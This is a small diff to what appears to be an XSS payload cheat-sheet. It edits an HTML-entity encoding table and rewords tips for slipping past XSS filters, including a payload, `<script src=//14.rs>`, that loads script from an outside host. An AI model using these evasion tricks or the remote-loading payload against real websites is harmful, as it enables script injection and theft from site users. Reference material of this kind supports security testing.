@@ -339,7 +339,7 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 |`&quest;`|?|`&#63;`|question mark|u+003F|\003f|\77|
 |`&commat;`|@|`&#64;`|at sign; commercial at|u+0040|\0040|\100|
 |`&lsqb;`|\[|`&#91;`|left square bracket|u+005B|\005b|\133|
-|`&bsol;`|/\|`&#92;`|backslash|u+005C|\005c|\134|
+|`&bsol;`|/|`&#92;`|backslash|u+005C|\005c|\134|
 |`&rsqb;`|]|`&#93;`|right square bracket|u+005D|\005d|\135|
 |`&Hat;`|^|`&#94;`|circumflex accent|u+005E|\005e|\136
 |`&lowbar;`|_|`&#95;`|low line|u+005F|\005f|\137|
@@ -355,7 +355,7 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 - You can use `//` to close a tag instead of `>`.
 - I have found that `confirm` is the least detected pop-up function so stop using `alert`.
 - Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
-- The shortest independent XSS payload is `script src=//14.rs` (19 chars)
+- The shortest HTML context XSS payload is `<script src=//14.rs>` (19 chars)
 
 ### Awesome Credits
 All the payloads are crafted by me unless specified.
